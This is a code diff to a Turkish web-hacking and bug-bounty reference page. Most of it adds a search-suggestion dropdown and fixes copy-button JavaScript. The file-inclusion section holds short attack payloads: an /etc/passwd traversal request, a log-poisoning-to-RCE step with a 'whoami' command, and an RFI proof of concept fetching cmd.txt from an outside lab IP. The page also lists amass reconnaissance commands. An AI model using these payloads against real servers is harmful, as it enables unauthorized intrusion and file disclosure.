@@ -76,6 +76,44 @@
     code {
       font-family: monospace;
     }
+    /* Yeni eklenen stiller: Öneri dropdown */
+    .search-suggestions {
+      position: absolute;
+      top: 100%;
+      left: 0;
+      right: 0;
+      background: var(--card);
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      max-height: 300px;
+      overflow-y: auto;
+      z-index: 100;
+      display: none;
+      margin-top: 4px;
+    }
+    .search-suggestions.visible {
+      display: block;
+    }
+    .search-suggestion {
+      padding: 12px;
+      cursor: pointer;
+      transition: background 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      color: #e6eef6;
+    }
+    .search-suggestion:hover {
+      background: var(--glass);
+    }
+    .search-suggestion.highlight {
+      background: var(--glass);
+    }
+    /* Filtreleme için hidden class */
+    .hidden {
+      display: none !important;
+    }
   </style>
 </head>
 <body>
@@ -229,7 +267,7 @@ javascriptrecon: {
             <div style="display:flex;align-items:center;gap:8px">
               <pre style="margin:0;white-space:pre-wrap">http://web.archive.org/cdx/search/cdx?url=example.com/*&output=txt&fl=original&collapse=urlkey</pre>
               <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
-                onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout()=>b.innerText='💥',1200);})(this)">💥</button>
+                onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
             </div>
             <div style="margin-top:6px;font-size:13px;color:#555">Wayback Machine üzerinden hedef siteye ait eski URL'leri çeker.</div>
           </li>
@@ -849,7 +887,7 @@ file_inclusion: {
       content: `
         <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
           <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Basit LFI: <code>GET /get.php?file=../../../../etc/passwd</code></li>
-          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log poisoning → RCE örnek akış: 1) User-Agent'a PHP kodu gönder (curl) 2) <code>?file=/var/log/apache2/access.log</code> ile include.</li>
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Log poisoning → RCE örnek akış: 1) User-Agent'a PHP kodu gönder (curl) 2) <code>?file=/var/log/apache2/access.log&c=whoami</code> ile include.</li>
           <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">RFI PoC (server izinliyse): <code>?file=http://10.10.145.212:8000/cmd.txt</code> (lab örneğinize benzer).</li>
           <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Flag örnekleri (challenge tarzı): curl ile POST istekleri veya null-byte traversal denemeleri kullanılabilir (lab-provided örneklerdeki gibi).</li>
         </ul>
@@ -1185,8 +1223,12 @@ tools: {
       title: 'Amass',
       content: `
       <div style="display:flex;align-items:center;gap:8px">
-        <pre style="margin:0;white-space:pre-wrap">amass enum -passive -d example.com
-amass enum -d example.com -brute -w /path/to/wordlist</pre>
+        <pre style="margin:0;white-space:pre-wrap">amass enum -passive -d example.com</pre>
+              <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
+                onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+      <pre style="margin:0;white-space:pre-wrap">amass enum -d example.com -brute -w /path/to/wordlist</pre>
               <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
                 onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
       </div>
@@ -1227,18 +1269,6 @@ amass enum -d example.com -brute -w /path/to/wordlist</pre>
                 onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
       </div>
       <div style="margin-top:6px;font-size:13px;color:#555">Bu komut: farklı pasif kaynaklardan hızlıca subdomain toplayıp birleştirir.</div>
-      `
-    },
-
-    {
-      title: 'Bitly',
-      content: `
-      <div style="display:flex;align-items:center;gap:8px">
-        <pre style="margin:0;white-space:pre-wrap"># bitly: URL kısaltma (link gizleme örneği)</pre>
-              <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
-                onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
-      </div>
-      <div style="margin-top:6px;font-size:13px;color:#555">Bu komut: uzun URL'leri kısaltmak ve paylaşımı kolaylaştırmak için kullanılır.</div>
       `
     },
 
@@ -1457,7 +1487,7 @@ sources: {
           <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
             <a href="https://www.youtube.com/c/HackerOneTV" target="_blank" style="color:#34d399;text-decoration:none">HackerOne TV</a>: Resmi HackerOne videoları ve etkinlikler.
           </li>
-          <li style="background:rgba(255,255,255,0;02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+          <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
             <a href="https://www.youtube.com/c/STOKfredrik" target="_blank" style="color:#34d399;text-decoration:none">STÖK</a>: İleri seviye web hacking ve bug bounty videoları.
           </li>
         </ul>
@@ -1580,8 +1610,9 @@ sources: {
       if (pageId === 'home') {
         main.innerHTML = `
           <div class="search-bar">
-            <input type="text" id="searchInput" placeholder="Konu, araç veya zafiyet ara..." />
+            <input type="text" id="searchInput" placeholder="Konu, araç veya zafiyet ara..." aria-label="Ara" autocomplete="off" />
             <span class="search-icon">🔍</span>
+            <div id="searchSuggestions" class="search-suggestions" role="listbox" aria-label="Arama önerileri" hidden></div>
           </div>
           <div class="hero">
             <h1>${page.title}</h1>
@@ -1626,6 +1657,7 @@ sources: {
         `;
         
         const quickLinks = document.getElementById('quickLinks');
+        quickLinks.innerHTML = '';
         Object.keys(CONTENT).forEach(key => {
           if (key === 'home') return;
           const item = CONTENT[key];
@@ -1641,6 +1673,114 @@ sources: {
         document.querySelectorAll('#quickLinks [data-page]').forEach(el => {
           el.addEventListener('click', () => showPage(el.dataset.page));
         });
+
+        // Arama fonksiyonelliği ekle
+        const searchInput = document.getElementById('searchInput');
+        const suggestionsDiv = document.getElementById('searchSuggestions');
+        let selectedIndex = -1;
+
+        if (searchInput) {
+          // Önceki listener'ı kaldır (double-bind önleme)
+          searchInput.removeEventListener('input', window.__bb_search_handler);
+          searchInput.removeEventListener('keydown', window.__bb_key_handler);
+          suggestionsDiv.removeEventListener('click', window.__bb_suggestion_click);
+
+          // Öneri handler
+          window.__bb_search_handler = function(e) {
+            const query = e.target.value.trim().toLowerCase();
+            suggestionsDiv.innerHTML = '';
+            suggestionsDiv.classList.remove('visible');
+            selectedIndex = -1;
+
+            if (query === '') return;
+
+            // CONTENT'ten eşleşen sayfaları topla
+            Object.keys(CONTENT).forEach(key => {
+              if (key === 'home') return;
+              const item = CONTENT[key];
+              const searchText = `${item.menuName || ''} ${item.title || ''} ${item.description || ''}`.toLowerCase();
+              let sectionMatches = '';
+              if (item.sections) {
+                item.sections.forEach(sec => {
+                  const secText = `${sec.title || ''}`.toLowerCase();
+                  if (secText.includes(query)) {
+                    sectionMatches += ` - ${sec.title}`;
+                  }
+                });
+              }
+
+              if (searchText.includes(query) || sectionMatches) {
+                const suggestion = document.createElement('div');
+                suggestion.classList.add('search-suggestion');
+                suggestion.dataset.page = key;
+                suggestion.innerHTML = `${item.icon || '📄'} ${item.menuName || item.title}${sectionMatches}`;
+                suggestionsDiv.appendChild(suggestion);
+              }
+            });
+
+            if (suggestionsDiv.children.length > 0) {
+              suggestionsDiv.classList.add('visible');
+            }
+          };
+
+          searchInput.addEventListener('input', window.__bb_search_handler);
+
+          // Klavye navigasyonu (arrow up/down, enter)
+          window.__bb_key_handler = function(e) {
+            const suggestions = suggestionsDiv.querySelectorAll('.search-suggestion');
+            if (suggestions.length === 0) return;
+
+            if (e.key === 'ArrowDown') {
+              selectedIndex = (selectedIndex + 1) % suggestions.length;
+              updateHighlight(suggestions);
+            } else if (e.key === 'ArrowUp') {
+              selectedIndex = (selectedIndex - 1 + suggestions.length) % suggestions.length;
+              updateHighlight(suggestions);
+            } else if (e.key === 'Enter') {
+              if (selectedIndex >= 0) {
+                const selected = suggestions[selectedIndex];
+                showPage(selected.dataset.page);
+                clearSearch();
+              }
+            } else if (e.key === 'Escape') {
+              clearSearch();
+            }
+          };
+
+          searchInput.addEventListener('keydown', window.__bb_key_handler);
+
+          // Tıklama handler
+          window.__bb_suggestion_click = function(e) {
+            if (e.target.classList.contains('search-suggestion')) {
+              showPage(e.target.dataset.page);
+              clearSearch();
+            }
+          };
+
+          suggestionsDiv.addEventListener('click', window.__bb_suggestion_click);
+
+          // Highlight güncelle
+          function updateHighlight(suggestions) {
+            suggestions.forEach((sug, idx) => {
+              sug.classList.toggle('highlight', idx === selectedIndex);
+            });
+          }
+
+          // Arama temizle
+          function clearSearch() {
+            searchInput.value = '';
+            suggestionsDiv.innerHTML = '';
+            suggestionsDiv.classList.remove('visible');
+            selectedIndex = -1;
+          }
+
+          // Dış tıklama ile kapat
+          document.addEventListener('click', function(e) {
+            if (!searchInput.contains(e.target) && !suggestionsDiv.contains(e.target)) {
+              clearSearch();
+            }
+          });
+        }
         
       } else {
         let html = `
@@ -1668,27 +1808,6 @@ sources: {
 
     renderMenu();
     showPage('home');
-    document.getElementById('searchInput').addEventListener('input', function() {
-      const query = this.value.toLowerCase();
-      document.querySelectorAll('#quickLinks .quick-link').forEach(link => {
-        const text = link.innerText.toLowerCase();
-        if(text.includes(query)) {
-          link.style.display = 'block';
-        } else {
-          link.style.display = 'none';
-        }
-      });
-      
-      document.querySelectorAll('#nav a, #nav .subitem').forEach(link => {
-        const text = link.innerText.toLowerCase();
-        if(text.includes(query)) {
-          link.style.display = 'block';
-        } else {
-          link.style.display = 'none';
-        }
-      });
-    });
-
   </script>
 </body>
 </html>
